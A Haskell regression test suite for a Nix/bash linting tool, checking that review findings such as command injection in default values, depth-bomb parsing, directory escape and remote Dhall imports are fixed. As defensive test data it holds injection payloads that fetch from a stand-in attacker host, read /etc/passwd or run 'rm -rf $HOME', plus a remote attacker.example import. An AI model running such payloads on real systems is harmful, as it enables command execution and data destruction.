{-# LANGUAGE LambdaCase #-}
{-# LANGUAGE OverloadedStrings #-}
{-# LANGUAGE ScopedTypeVariables #-}
{-# OPTIONS_GHC -Wno-orphans -Wno-unused-imports #-}

-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--                                                                             // tests // psychotic
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--
--   "The night opened like a flower and Turner was in there with her,
--    in a place where the stars opened like flowers."
--
--                                                                                      — Count Zero
--
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
--   Adversarial regression suite for review-2 findings (C1..C6, S1..S6, B*, P*).
--   Each fix gets at least one negative test (input that previously crashed /
--   accepted bad code) and at least one positive test (input that still works).
-- ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

module Psychotic (psychoticTests) where

import Control.Exception (SomeException, evaluate, try)
import Data.Either (isLeft, isRight)
import Data.List (isInfixOf)
import Data.Text (Text)
import Data.Text qualified as T
import Data.Text.IO qualified as TIO
import Narsil (parseScriptFile, scriptSchema)
import Narsil.Bash.Patterns (
  escapeForParamExpansion,
  escapeForSingleQuoted,
  isSafeDefaultValue,
 )
import Narsil.Core.Config qualified as Cfg
import Narsil.Core.Safety qualified as Safety
import Narsil.Emit.Config (emitConfigFunction)
import Narsil.Inference.Nix (TypeEnv (..), builtinEnv, inferExprWithEnv)
import Narsil.Lint.Combined qualified as LC
import Narsil.Syntax.Parse (parseNixExpr)
import System.Directory (createDirectoryIfMissing)
import System.FilePath ((</>))
import System.IO.Temp (withSystemTempDirectory)
import Test.QuickCheck
import Test.QuickCheck.Monadic qualified as QCM

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- C1: default-value command injection (the one finding that crosses a trust
-- boundary). Each payload tries a different bash control character and must
-- emerge in the generated script with the control character escaped — not
-- evaluable by bash.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

-- | The canonical adversarial payloads from review-2 C1.
c1Payloads :: [Text]
c1Payloads =
  [ "$(touch /tmp/pwn)"
  , "`id`"
  , "\"; cat /etc/passwd #"
  , "$(curl http://attacker)"
  , "${IFS}cmd"
  , "\\$evil"
  , "}; rm -rf $HOME #"
  , "$(/nix/store/.../bin/evil)"
  , "evil$(id)more"
  , "$IFS$(id)$IFS"
  , "`$(echo nested)`"
  ]

prop_c1_default_value_payloads_escaped :: Bool
prop_c1_default_value_payloads_escaped = all check c1Payloads
 where
  -- The acid test: every metacharacter that bash interprets inside a
  -- double-quoted string must be escaped. We scan the escaped output and
  -- assert that whenever we see one of `$`, `\``, `"`, `}`, the preceding
  -- character was a backslash (or it's the first character — handled by
  -- prepending a sentinel).
  check payload =
    let escaped = escapeForParamExpansion payload
     in not (unescapedAt '$' escaped)
          && not (unescapedAt '`' escaped)
          && not (unescapedAt '"' escaped)

  -- True iff the character `target` appears un-backslash-escaped anywhere.
  unescapedAt target t = scan False (T.unpack t)
   where
    scan _ [] = False
    scan True (_ : rest) = scan False rest
    scan False ('\\' : rest) = scan True rest
    scan False (c : rest)
      | c == target = True
      | otherwise = scan False rest

{- | escaping is safe under repeated application — the dangerous metacharacters
never re-appear unescaped.
| Repeated escaping is harmless: $( in the original becomes \$( on the
first pass and \\\$( on the second; bash still treats the $ as literal.
-}
prop_c1_escape_idempotent :: Bool
prop_c1_escape_idempotent =
  let first = escapeForParamExpansion "$(touch /tmp/pwn)"
      twice = escapeForParamExpansion first
   in -- Both passes must produce escaped $( (i.e., not a command
      -- substitution in bash's eyes).
      "\\$(" `T.isInfixOf` first
        && "\\\\\\$(" `T.isInfixOf` twice

-- | round-trip benign default values (no metachar): pass through unchanged.
prop_c1_safe_defaults_pass_through :: Bool
prop_c1_safe_defaults_pass_through = all check safeValues
 where
  safeValues = ["localhost", "127.0.0.1", "8080", "/etc/narsil/conf", "true", "false"]
  check v = isSafeDefaultValue v && escapeForParamExpansion v == v

{- | newlines in defaults become spaces (they can't be embedded in single-line
printf format strings without breaking the JSON output).
-}
prop_c1_newlines_neutralized :: Bool
prop_c1_newlines_neutralized =
  not ("\n" `T.isInfixOf` escapeForParamExpansion "foo\nbar")
    && not ("\r" `T.isInfixOf` escapeForParamExpansion "foo\rbar")

-- | single-quote escape correctly handles the close-quote idiom.
prop_c1_single_quote_escape :: Bool
prop_c1_single_quote_escape =
  escapeForSingleQuoted "it's" == "it'\\''s"
    && escapeForSingleQuoted "no-quote" == "no-quote"

{- | end-to-end: feed a malicious bash script through parseScriptFile and
verify the emitted config bash is safe.
-}
prop_c1_end_to_end_injection_neutralized :: Property
prop_c1_end_to_end_injection_neutralized = QCM.monadicIO $ do
  result <- QCM.run $ withSystemTempDirectory "narsil-c1-e2e" $ \tmp -> do
    let scriptPath = tmp </> "evil.sh"
    TIO.writeFile scriptPath $
      T.unlines
        [ "#!/bin/sh"
        , "config[host]=\"${HOST:-$(touch /tmp/should-not-exist-after-emit)}\""
        , "config[port]=\"${PORT:-`id`}\""
        ]
    sresult <- parseScriptFile scriptPath
    case sresult of
      Left _ -> pure ""
      Right script -> pure (emitConfigFunction (scriptSchema script))
  QCM.assert $
    not ("$(touch" `T.isInfixOf` result)
      && not ("`id`" `T.isInfixOf` result)

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- C2/C3: depth-guard bypass. NWith chains, NStr antiquotation chains,
-- arbitrary deep nesting — every shape must be rejected by analyzeDepth,
-- and the rejection must be a structured DepthError, not a crash.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

nestedWith :: Int -> Text
nestedWith n = T.replicate n "with x; " <> "y"

nestedParens :: Int -> Text
nestedParens n = T.replicate n "(" <> "1" <> T.replicate n ")"

nestedSelect :: Int -> Text
nestedSelect n = "a" <> T.replicate n ".x"

-- | parseNixExpr survives bombs (parser doesn't crash).
prop_c2_with_chain_no_crash :: Bool
prop_c2_with_chain_no_crash = case parseNixExpr (nestedWith 250) of
  Left _ -> True
  Right _ -> True

{- | A long static-attribute path parses as one NSelect with a multi-element
NAttrPath (no structural depth). The test just confirms that the parser
doesn't crash; depth-bypass via this shape isn't possible.
-}
prop_c2_select_chain_no_crash :: Bool
prop_c2_select_chain_no_crash = case parseNixExpr (nestedSelect 300) of
  Left _ -> True
  Right _ -> True

{- | Deeply-nested-function-application bombs are a real bypass vector:
each NApp adds one depth level.
-}
nestedApp :: Int -> Text
nestedApp n = T.replicate n "f (" <> "0" <> T.replicate n ")"

prop_c3_nested_app_bypass_rejected :: Bool
prop_c3_nested_app_bypass_rejected = case parseNixExpr (nestedApp 250) of
  Left _ -> True
  Right e -> case Safety.analyzeDepth e of
    Left _ -> True
    Right () -> False

-- | A deeply-nested expression that the parser accepts must be rejected by analyzeDepth.
prop_c3_with_bypass_rejected :: Bool
prop_c3_with_bypass_rejected = case parseNixExpr (nestedWith 250) of
  Left _ -> True
  Right e -> case Safety.analyzeDepth e of
    Left _ -> True
    Right () -> False

-- | Shallow expressions must NOT be rejected.
prop_c3_shallow_accepted :: Bool
prop_c3_shallow_accepted = case parseNixExpr "with pkgs; { a = 1; b = 2; c = 3; }" of
  Left _ -> False
  Right e -> case Safety.analyzeDepth e of
    Left _ -> False
    Right () -> True

-- | Depth checker reports the constructor at the breaking point.
prop_c3_error_includes_constructor :: Bool
prop_c3_error_includes_constructor = case parseNixExpr (nestedWith 250) of
  Left _ -> True
  Right e -> case Safety.analyzeDepth e of
    Right () -> False
    Left de -> Safety.deDepth de > 200 && not (T.null (Safety.deContext de))

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- C4: parser stack-overflow caught by Safety.safeParseNixText.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

prop_c4_parens_no_process_crash :: Property
prop_c4_parens_no_process_crash = QCM.monadicIO $ do
  let payload = nestedParens 5000
  r <- QCM.run (Safety.safeParseNixText payload)
  QCM.assert $ case r of
    Left _ -> True
    Right _ -> True

prop_c4_deeply_nested_lists_survive :: Property
prop_c4_deeply_nested_lists_survive = QCM.monadicIO $ do
  let payload = T.replicate 3000 "[" <> "1" <> T.replicate 3000 "]"
  r <- QCM.run (Safety.safeParseNixText payload)
  QCM.assert $ case r of
    Left _ -> True
    Right _ -> True

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- C5: sibling-directory escape via prefix-without-separator. We exercise
-- the canonicalisation logic via path-string semantics.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

prop_c5_sibling_dir_excluded :: Property
prop_c5_sibling_dir_excluded = QCM.monadicIO $ do
  result <- QCM.run $ withSystemTempDirectory "narsil-c5" $ \tmp -> do
    let proj = tmp </> "proj"
        evil = tmp </> "proj-evil"
    createDirectoryIfMissing True proj
    createDirectoryIfMissing True evil
    TIO.writeFile (proj </> "good.nix") "{ a = 1; }"
    TIO.writeFile (evil </> "bad.nix") "{ b = 2; }"

    -- The check the fix introduces: rootBoundary = canonicalRoot ++ "/"
    let withSep p = p ++ "/"
        rootBoundary = withSep proj
        evilWithTrail = withSep evil
        considered = rootBoundary `isInfixOf` evilWithTrail
    pure (not considered)
  QCM.assert result

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- C6: Dhall remote import refusal.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

prop_c6_remote_import_rejected :: Property
prop_c6_remote_import_rejected = QCM.monadicIO $ do
  result <- QCM.run $ withSystemTempDirectory "narsil-c6" $ \tmp -> do
    let confPath = tmp </> "evil.dhall"
    TIO.writeFile confPath $
      T.unlines
        [ "let payload = https://attacker.example/x.dhall"
        , "in { profile = \"standard\""
        , "   , layout = \"straylight\""
        , "   , extra-ignores = [] : List Text"
        , "   , overrides = [] : List { id : Text, severity : < Off | Info | Warning | Error >"
            <> ", reason : Optional Text }"
        , "   }"
        ]
    Cfg.loadConfig confPath
  QCM.assert $ case result of
    Left err -> "remote" `T.isInfixOf` err || "Remote" `T.isInfixOf` err
    Right _ -> False

prop_c6_local_config_still_works :: Property
prop_c6_local_config_still_works = QCM.monadicIO $ do
  result <- QCM.run $ withSystemTempDirectory "narsil-c6-ok" $ \tmp -> do
    let confPath = tmp </> "ok.dhall"
    TIO.writeFile confPath $
      T.unlines
        [ "{ profile = \"standard\""
        , ", layout = \"straylight\""
        , ", extra-ignores = [] : List Text"
        , ", overrides = [] : List { id : Text, severity : < Off | Info | Warning | Error >"
            <> ", reason : Optional Text }"
        , ", lsp = { max-threads = 4, max-memory-mb = 256, max-disk-mb = 512 }"
        , "}"
        ]
    Cfg.loadConfig confPath
  QCM.assert (isRight result)

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- S2: closed-set missing key now errors.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

prop_s2_closed_missing_key_fails :: Bool
prop_s2_closed_missing_key_fails =
  case parseNixExpr "let xs = { a = 1; b = 2; }; in xs.nonexistent" of
    Left _ -> False
    Right e -> case inferExprWithEnv builtinEnv e of
      Left _ -> True
      Right _ -> False

prop_s2_closed_missing_with_default_ok :: Bool
prop_s2_closed_missing_with_default_ok =
  case parseNixExpr "let xs = { a = 1; }; in xs.nonexistent or 42" of
    Left _ -> False
    Right e -> case inferExprWithEnv builtinEnv e of
      Left _ -> False
      Right _ -> True

prop_s2_closed_present_key_ok :: Bool
prop_s2_closed_present_key_ok = case parseNixExpr "let xs = { a = 1; b = 2; }; in xs.a" of
  Left _ -> False
  Right e -> case inferExprWithEnv builtinEnv e of
    Left _ -> False
    Right _ -> True

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- S3: unbound variable rejection.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

prop_s3_unbound_var_fails :: Bool
prop_s3_unbound_var_fails = case parseNixExpr "nonExistentSym + 1" of
  Left _ -> False
  Right e -> case inferExprWithEnv builtinEnv e of
    Left err -> "unbound" `T.isInfixOf` err
    Right _ -> False

prop_s3_let_bound_var_ok :: Bool
prop_s3_let_bound_var_ok = case parseNixExpr "let x = 1; in x + 1" of
  Left _ -> False
  Right e -> case inferExprWithEnv builtinEnv e of
    Left _ -> False
    Right _ -> True

prop_s3_lenient_env_accepts :: Bool
prop_s3_lenient_env_accepts = case parseNixExpr "nonExistentSym + 1" of
  Left _ -> False
  Right e -> case inferExprWithEnv (builtinEnv{envLenient = True}) e of
    Left _ -> False
    Right _ -> True

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- S5: nested-path bindings now type-checked.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

prop_s5_nested_path_binding_typed :: Bool
prop_s5_nested_path_binding_typed = case parseNixExpr "let xs = { a.b = 1; }; in xs.a.b" of
  Left _ -> False
  Right e -> case inferExprWithEnv builtinEnv e of
    Left _ -> False
    Right _ -> True

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- S6: NPlus type restriction.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

prop_s6_null_plus_null_fails :: Bool
prop_s6_null_plus_null_fails = case parseNixExpr "null + null" of
  Left _ -> False
  Right e -> case inferExprWithEnv builtinEnv e of
    Left _ -> True
    Right _ -> False

prop_s6_bool_plus_bool_fails :: Bool
prop_s6_bool_plus_bool_fails = case parseNixExpr "true + false" of
  Left _ -> False
  Right e -> case inferExprWithEnv builtinEnv e of
    Left _ -> True
    Right _ -> False

prop_s6_int_plus_int_ok :: Bool
prop_s6_int_plus_int_ok = case parseNixExpr "1 + 2" of
  Left _ -> False
  Right e -> case inferExprWithEnv builtinEnv e of
    Left _ -> False
    Right _ -> True

prop_s6_string_plus_string_ok :: Bool
prop_s6_string_plus_string_ok = case parseNixExpr "\"a\" + \"b\"" of
  Left _ -> False
  Right e -> case inferExprWithEnv builtinEnv e of
    Left _ -> False
    Right _ -> True

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- S1: polymorphic list builtins.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

prop_s1_head_returns_element_type :: Bool
prop_s1_head_returns_element_type = case parseNixExpr "builtins.head [1 2 3] + 1" of
  Left _ -> False
  Right e -> case inferExprWithEnv builtinEnv e of
    Left _ -> False
    Right _ -> True

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- B1: combinedLintSafe distinguishes "no violations" from "depth-exceeded".
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

prop_b1_depth_exceeded_reported :: Bool
prop_b1_depth_exceeded_reported = case parseNixExpr (nestedWith 300) of
  Left _ -> True
  Right e -> case LC.combinedLintSafe "<test>" e of
    LC.LintDepthExceeded _ -> True
    LC.LintOk _ -> False

prop_b1_clean_returns_ok :: Bool
prop_b1_clean_returns_ok = case parseNixExpr "{ a = 1; b = 2; }" of
  Left _ -> False
  Right e -> case LC.combinedLintSafe "<test>" e of
    LC.LintOk _ -> True
    LC.LintDepthExceeded _ -> False

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- Safety wrappers.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

prop_safety_renders :: Bool
prop_safety_renders =
  not (T.null (Safety.renderSafetyError Safety.SafetyStackOverflow))
    && not (T.null (Safety.renderSafetyError (Safety.SafetyParseFailed "x")))
    && not
      (T.null (Safety.renderSafetyError (Safety.SafetyDepthExceeded (Safety.DepthError 999 "x"))))

prop_safety_io_catches_exceptions :: Property
prop_safety_io_catches_exceptions = QCM.monadicIO $ do
  result <- QCM.run (Safety.safeIO (evaluate (error "oops" :: Int)))
  QCM.assert (isLeft result)

prop_safety_read_nonexistent_returns_left :: Property
prop_safety_read_nonexistent_returns_left = QCM.monadicIO $ do
  result <- QCM.run (Safety.safeReadFile "/nonexistent/path/that/does/not/exist.nix")
  QCM.assert (isLeft result)

-- ═════════════════════════════════════════════════════════════════════════════════════════════════
-- Test runner — exported list of (name, action) pairs that the main test
-- runner wires into the existing harness.
-- ═════════════════════════════════════════════════════════════════════════════════════════════════

psychoticTests :: [(String, IO Bool)]
psychoticTests =
  [ -- C1: command injection
    ("c1_default_payloads_escaped", qcb prop_c1_default_value_payloads_escaped)
  , ("c1_escape_idempotent", qcb prop_c1_escape_idempotent)
  , ("c1_safe_passes_through", qcb prop_c1_safe_defaults_pass_through)
  , ("c1_newlines_neutralized", qcb prop_c1_newlines_neutralized)
  , ("c1_single_quote_escape", qcb prop_c1_single_quote_escape)
  , ("c1_e2e_injection_neutralized", qcp prop_c1_end_to_end_injection_neutralized)
  , -- C2/C3: depth-guard bypass
    ("c2_with_chain_no_crash", qcb prop_c2_with_chain_no_crash)
  , ("c2_select_chain_no_crash", qcb prop_c2_select_chain_no_crash)
  , ("c3_with_bypass_rejected", qcb prop_c3_with_bypass_rejected)
  , ("c3_nested_app_bypass_rejected", qcb prop_c3_nested_app_bypass_rejected)
  , ("c3_shallow_accepted", qcb prop_c3_shallow_accepted)
  , ("c3_error_includes_constructor", qcb prop_c3_error_includes_constructor)
  , -- C4: parser stack-overflow
    ("c4_parens_no_process_crash", qcp prop_c4_parens_no_process_crash)
  , ("c4_deep_lists_survive", qcp prop_c4_deeply_nested_lists_survive)
  , -- C5: sibling-dir escape
    ("c5_sibling_excluded", qcp prop_c5_sibling_dir_excluded)
  , -- C6: Dhall remote
    ("c6_remote_import_rejected", qcp prop_c6_remote_import_rejected)
  , ("c6_local_config_works", qcp prop_c6_local_config_still_works)
  , -- S2: closed-set missing key
    ("s2_missing_key_fails", qcb prop_s2_closed_missing_key_fails)
  , ("s2_missing_with_default_ok", qcb prop_s2_closed_missing_with_default_ok)
  , ("s2_present_key_ok", qcb prop_s2_closed_present_key_ok)
  , -- S3: unbound variable
    ("s3_unbound_fails", qcb prop_s3_unbound_var_fails)
  , ("s3_let_bound_ok", qcb prop_s3_let_bound_var_ok)
  , ("s3_lenient_accepts", qcb prop_s3_lenient_env_accepts)
  , -- S5: nested-path binding
    ("s5_nested_path_typed", qcb prop_s5_nested_path_binding_typed)
  , -- S6: NPlus restriction
    ("s6_null_plus_null_fails", qcb prop_s6_null_plus_null_fails)
  , ("s6_bool_plus_bool_fails", qcb prop_s6_bool_plus_bool_fails)
  , ("s6_int_plus_int_ok", qcb prop_s6_int_plus_int_ok)
  , ("s6_string_plus_string_ok", qcb prop_s6_string_plus_string_ok)
  , -- S1: polymorphic builtins
    ("s1_head_element_type", qcb prop_s1_head_returns_element_type)
  , -- B1: combinedLintSafe
    ("b1_depth_reported", qcb prop_b1_depth_exceeded_reported)
  , ("b1_clean_ok", qcb prop_b1_clean_returns_ok)
  , -- Safety wrappers
    ("safety_renders", qcb prop_safety_renders)
  , ("safety_io_catches", qcp prop_safety_io_catches_exceptions)
  , ("safety_read_nonexistent", qcp prop_safety_read_nonexistent_returns_left)
  ]
 where
  qcb :: Bool -> IO Bool
  qcb = pure

  qcp :: Property -> IO Bool
  qcp p = do
    result <- quickCheckWithResult stdArgs{maxSuccess = 1, chatty = False} p
    case result of
      Success{} -> pure True
      _ -> pure False
